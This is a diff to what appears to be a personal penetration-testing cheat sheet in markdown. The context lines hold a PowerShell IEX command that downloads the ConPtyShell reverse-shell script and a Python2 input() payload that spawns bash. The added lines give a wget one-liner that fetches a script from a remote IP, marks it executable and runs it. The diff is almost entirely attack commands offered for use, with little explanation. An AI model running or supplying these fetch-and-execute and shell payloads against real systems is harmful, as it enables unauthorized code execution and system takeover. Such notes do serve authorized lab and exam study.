@@ -192,3 +192,11 @@ IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-
 
 ## Python2
 1. RCE in input() ```__import__('os').system("bash") ```
+
+# Curl
+- sometimes try to remove http:// if cant curl or wget
+## Alternative:
+- wget
+### Oneliner 
+- ``` wget 192.168.45.176/bash.sh -O /tmp/bash.sh && chmod +x /tmp/bash.sh && /tmp/bash.sh  ```
+
